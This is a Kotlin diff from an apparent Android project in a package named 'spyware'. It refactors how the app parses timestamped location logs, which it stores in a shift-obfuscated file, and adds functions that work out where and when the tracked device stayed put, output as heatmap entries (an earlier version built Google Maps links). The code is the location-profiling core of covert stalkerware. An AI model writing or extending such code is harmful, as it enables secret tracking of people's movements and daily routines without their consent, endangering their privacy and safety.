@@ -1,6 +1,12 @@
 import android.content.Context
 import android.os.Environment
 import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
+import com.example.spyware.common.Constants.Companion.END_TIMESTAMP
+import com.example.spyware.common.Constants.Companion.ERROR
+import com.example.spyware.common.Constants.Companion.LATITUDE
+import com.example.spyware.common.Constants.Companion.LONGITUDE
+import com.example.spyware.common.Constants.Companion.START_TIMESTAMP
+import com.example.spyware.common.Constants.Companion.TIMESTAMP
 import com.example.spyware.common.Constants.Companion.logShift
 import com.example.spyware.common.Constants.Companion.outputFileName
 import org.json.JSONObject
@@ -67,7 +73,7 @@ fun filterLogsOnDate(logs:String, startInstant:Instant?, endInstant:Instant?): S
     val filteredLogs = logs.lines().filter { line ->
         try {
             val jsonObject = JSONObject(line)
-            val timestampStr = jsonObject.getString("timestamp")
+            val timestampStr = jsonObject.getString(TIMESTAMP)
             if (timestampStr.isNotEmpty()) {
                 val timestamp = Instant.parse(timestampStr)
                 timestamp.isAfter(startInstant) && timestamp.isBefore(endInstant)
@@ -89,17 +95,18 @@ fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
 
 fun log(context:Context, jsonObject: JSONObject){
     val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
-    jsonObject.put("timestamp", currentUtcTime)
+    jsonObject.put(TIMESTAMP, currentUtcTime)
     appendShiftedToFile(context.filesDir,outputFileName, jsonObject.toString(),logShift)
 }
 
-//fun renderLogs(content:String):String{
-//
-//}
-
-fun getErrorsFromLogs(context:Context): String {
+fun getLogs(context:Context):List<JSONObject>{
     val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
-    return content?.lines()?.filter { it.contains("\"error\":\"") }?.joinToString("\n") ?: ""
+    return content?.lines()?.filter { it.isNotBlank() }?.map { JSONObject(it) } ?: listOf()
+}
+
+fun getErrorStringsFromLogs(context:Context): String {
+    val logs=getLogs(context)
+    return logs.filter { log-> log.has(ERROR) }.joinToString("\n") { it.toString() }
 }
 
 /**
@@ -108,31 +115,34 @@ fun getErrorsFromLogs(context:Context): String {
 fun getReducedLogs(context:Context,startInstant:Instant?,endInstant:Instant?): String {
     val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
     val filteredLogs= filterLogsOnDate(content?:return "",startInstant,endInstant)
-    val locationLogs= filteredLogs?.lines()?.filter { it.contains("\"latitude\":") }?.joinToString("\n") ?: ""
-    val result=getImportantLocations(locationLogs)
-    return result
+    val locationJSONObjects= filteredLogs.lines().filter { it.isNotBlank() }.map { JSONObject(it) }.filter { it.has(LATITUDE) }
+    val importantLocations=getImportantLocations(locationJSONObjects)
+    return importantLocations.map{ formatHeatmap(it)}.joinToString("\n")
 }
 
-fun getImportantLocations(locationLogs:String): String {
-    val locations= locationLogs.lines()
-        .filter { it.isNotBlank() } // Filter out empty lines
-        .mapNotNull {
-            try { JSONObject(it) }
-            catch (e: Exception) { null } // Handle potential JSON parsing errors
-        }
-    var result = ""
+//fun getTraversedPath(context:Context,startInstant:Instant?,endInstant:Instant?): String {
+//    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
+//    val filteredLogs= filterLogsOnDate(content?:return "",startInstant,endInstant)
+//    val locationLogs= filteredLogs?.lines()?.filter { it.contains("\""+ LATITUDE"\":") }?.joinToString("\n") ?: ""
+//    val result=getImportantLocations(locationLogs)
+//    return result
+//}
+
+
+fun getImportantLocations(locations:List<JSONObject>): List<JSONObject> {
+    var result = mutableListOf<JSONObject>()
     var i=0
     while (i <locations.size) {
-//        println("Location: "+locations[i])
         var j=i+1
         while(j<locations.size && calculateDistance(locations[i],locations[j])< DISTINGUISHING_DISTANCE_KM){
             j++
         }
         if(j-i>=2){
             var bestEstimateLocation=estimateLocation(locations,i,j-1)
-            var entry=convertUtcToLocal(locations[i].getString("timestamp"))+" -> "+convertUtcToLocal(locations[j-1].getString("timestamp"))+": https://www.google.com/maps/place/"+bestEstimateLocation.getDouble("latitude")+","+bestEstimateLocation.getDouble("longitude")
-//            println("StableLocation: "+entry)
-            result=result+entry+"\n"
+            var entry=JSONObject().put(START_TIMESTAMP,locations[i].getString(TIMESTAMP)).put(
+                END_TIMESTAMP,locations[j-1].getString(TIMESTAMP)).put(LATITUDE,bestEstimateLocation.getDouble(
+                LATITUDE)).put(LONGITUDE,bestEstimateLocation.getDouble(LONGITUDE))
+            result.add(entry)
         }
         i=j
     }
@@ -144,11 +154,11 @@ fun estimateLocation(locations:List<JSONObject>,i:Int,j:Int):JSONObject{
     var sumLat=0.0
     var sumLon=0.0
     while(x<=j){
-        sumLat+=locations[x].getDouble("latitude")
-        sumLon+=locations[x].getDouble("longitude")
+        sumLat+=locations[x].getDouble(LATITUDE)
+        sumLon+=locations[x].getDouble(LONGITUDE)
         x++
     }
-    return JSONObject().put("latitude",sumLat/(j-i+1)).put("longitude",sumLon/(j-i+1))
+    return JSONObject().put(LATITUDE,sumLat/(j-i+1)).put(LONGITUDE,sumLon/(j-i+1))
 }
 
 fun convertUtcToLocal(utcTime: String): String {
@@ -161,7 +171,8 @@ fun convertUtcToLocal(utcTime: String): String {
 
 
 fun calculateDistance(loc1:JSONObject,loc2:JSONObject):Double{
-    return calculateDistance(loc1.getDouble("latitude"),loc1.getDouble("longitude"),loc2.getDouble("latitude"),loc2.getDouble("longitude"))
+    return calculateDistance(loc1.getDouble(LATITUDE),loc1.getDouble(LONGITUDE),loc2.getDouble(
+        LATITUDE),loc2.getDouble(LONGITUDE))
 }
 
 // Function to calculate distance between two coordinates using Haversine formula
